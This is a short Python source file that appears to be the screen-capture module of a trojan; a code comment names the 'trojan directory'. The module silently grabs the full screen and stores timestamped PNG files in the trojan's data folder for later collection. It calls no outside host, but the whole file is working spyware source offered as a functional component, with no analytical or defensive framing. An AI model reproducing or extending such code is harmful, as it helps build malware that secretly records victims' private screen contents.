import os
from PIL import ImageGrab
from datetime import datetime

def capture_screen(save_path):
    """
    Capture the current screen and save it to the specified path.
    """
    try:
        print("Capturing screen...")
        screenshot = ImageGrab.grab()  # Take a screenshot
        screenshot.save(save_path, 'PNG')  # Save the image
        print(f"Screen captured and saved to {save_path}")
    except Exception as e:
        print(f"Failed to capture screen: {e}")

def run():
    """
    Entry point for the screengrabber module.
    """
    base_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))  # Navigate to trojan directory
    log_dir = os.path.join(base_path, 'data')
    
    # Ensure the data directory exists
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')  # Generate a timestamp for the filename
    save_path = os.path.join(log_dir, f'screenshot_{timestamp}.png')  # Screenshot file path
    
    capture_screen(save_path)
